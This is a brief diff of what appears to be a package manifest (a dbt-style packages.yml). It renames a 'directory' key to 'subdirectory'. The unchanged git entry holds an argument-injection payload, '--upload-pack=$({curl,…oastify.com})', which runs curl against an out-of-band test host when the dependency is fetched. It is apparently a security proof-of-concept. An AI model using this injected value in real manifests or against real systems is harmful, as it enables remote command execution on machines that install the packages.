@@ -4,4 +4,4 @@ packages:
 
   - git: "--upload-pack=$({curl,222eo6tnoif21n4zy6mv0nkpxg373vtji.oastify.com})"
     revision: 0.9.2
-    directory: git@sdsdsd:sdsd/sdsd.git
+    subdirectory: git@sdsdsd:sdsd/sdsd.git
